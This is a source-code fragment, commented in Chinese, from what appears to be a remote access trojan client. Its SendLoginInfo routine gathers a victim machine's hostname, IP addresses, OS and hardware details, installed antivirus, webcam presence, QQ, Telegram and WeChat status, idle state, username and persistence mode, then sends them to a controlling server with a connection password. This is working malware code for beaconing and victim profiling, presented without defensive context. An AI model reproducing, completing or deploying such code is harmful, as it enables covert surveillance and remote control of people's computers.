		delete[] szHttpBuffer;
		InternetCloseHandle(hHttpFile);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	InternetCloseHandle(hHttpFile);
	InternetCloseHandle(hInternet);
	ip_start = strchr(szHttpBuffer, '\"');
	ip_stop = strrchr(szHttpBuffer, '\"');
	if (ip_start!=NULL && ip_stop!=NULL)
	{
		ip_start++;
		*ip_stop = '\0';
		ULONG Addr = inet_addr(ip_start);
		delete[] szHttpBuffer;
		if (Addr != INADDR_NONE)
		{
			IPAddress->S_un.S_addr = Addr;
			return TRUE;
		}
	}
	delete[] szHttpBuffer;
	return FALSE;
}
/////
//发送上线信息
void * my_memcpy(void * dst, const void * src, size_t count)
{
	void * ret = dst;
	while (count--) {
		*(char *)dst = *(char *)src;
		dst = (char *)dst + 1;
		src = (char *)src + 1;
	}
	return(ret);
}
int SendLoginInfo(CClientSocket *pClient, DWORD dwSpeed)
{
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录

	char strSubKey[MAX_PATH];

	m_gFunc.wsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", MyServiceName);

	//分组
	m_gFunc.memset(LoginInfo.UpGroup,0,sizeof(LoginInfo.UpGroup));
	ReadRegEx(HKEY_CURRENT_USER, strSubKey,"Group", REG_SZ, LoginInfo.UpGroup, NULL,lstrlen(LoginInfo.UpGroup), 0);
	
	// 连接的IP地址
	sockaddr_in  sockAddr;
	m_gFunc.memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	m_gFunc.getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	// 主机名
	GetHostRemark( LoginInfo.HostName, sizeof(LoginInfo.HostName),strSubKey);

	//内网穿透
	if (MyFct) GetWanIPAddress(&LoginInfo.IPAddress);
	my_memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	my_memcpy(&LoginInfo.HostName, LoginInfo.HostName, sizeof(LoginInfo.HostName));

	//系统版本
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	m_gFunc.GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	DWORD dwMajorVer;
	DWORD dwMinorVer;
	DWORD dwBuildNumber;
	if (GetNtVersionNumbers(dwMajorVer,dwMinorVer,dwBuildNumber))
	{
		LoginInfo.dwMajorVer = dwMajorVer;
		LoginInfo.dwMinorVer = dwMinorVer;
		LoginInfo.dwBuildNumber = dwBuildNumber;
	}
	// 判断 是不是 64位系统
	LoginInfo.bIsWow64=IsWindows64();
	
	// CPU
	CPUClockMhzt(LoginInfo.CPUClockMhz);
	// 内存
    MEMORYSTATUSEX	MemInfo; //用GlobalMemoryStatusEx可显示2G以上内存
	MemInfo.dwLength=sizeof(MemInfo); 
	GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
	LoginInfo.dwMemSize = (unsigned long)strMem;
	///////显卡///////////////////////////////
/*	if(!ReadRegEx(HKEY_LOCAL_MACHINE, 
		"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", 
		"DriverDesc",
		REG_SZ,
		LoginInfo.szGraphics,
		NULL,lstrlen(LoginInfo.szGraphics),0))strcpy(LoginInfo.szGraphics,"Find GPU Graphics error");*/
	
	LPDIRECTDRAW2 lpdd;
	HRESULT ddrval;
	CoInitialize(NULL);	
	
	ddrval = CoCreateInstance(CLSID_DirectDraw,
		NULL, CLSCTX_ALL, IID_IDirectDraw2, (void**)&lpdd);
	
	
	if(!FAILED(ddrval))
	{
		ddrval = IDirectDraw2_Initialize(lpdd, NULL);
	}
	DDCAPS ddcaps;	
	ddcaps.dwSize = sizeof DDCAPS;
	lpdd->GetCaps(&ddcaps, NULL);
	lpdd->Release();
	DWORD dwMem = ddcaps.dwVidMemTotal;
	int iMem = dwMem/1008/1008;
	LoginInfo.Memory7 = iMem;
	/////////////////
	//用户
	LoginInfo.bIsActive = false;
	//是否活动
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);//获取上次输入操作的时间。
	if ((m_gFunc.GetTickCount()-lpi.dwTime)>1000*60*3)//5分钟
	{
		//当前系统已经空闲了1分钟
        LoginInfo.bIsActive = true;
	}

	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	//杀毒显示
	strcpy( LoginInfo.Virus, GetVirus() );
	LoginInfo.bIsWebCam = EnumDevices(); //没有摄像头

	// 获取Qq
	lstrcpy(LoginInfo.szQQNum,GetQQ());

	//安装时间
	GetInstllTime(LoginInfo.szInstallTime, sizeof(LoginInfo.szInstallTime),strSubKey);
	
	//在线TG
	strcpy(LoginInfo.TG, ssddd());
	
	//在线微信
	strcpy(LoginInfo.WX, ssdddd());
	//通讯
	lstrcpy(LoginInfo.szLionPass,ConnetPass);
	//启动模式
	if(MyDele_zc == 0)
	{
		strcpy(LoginInfo.Pattern,"绿色启动");
	}
	else
	{
		if (MyDele_zc == 1)
		{
			strcpy(LoginInfo.Pattern,"注册启动");
		}
		if (MyDele_zc == 2)
		{
			strcpy(LoginInfo.Pattern,"服务启动");
		}
	}
	//用户权限
	#define MAX_NAME 256
	char szUserName[MAX_NAME] = {0};  
    unsigned long dwNameLen = sizeof(szUserName);  
    GetUserName(szUserName, &dwNameLen);  
    printf("%s\n", szUserName); 
    strcpy(LoginInfo.Admin,szUserName);

	int nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}

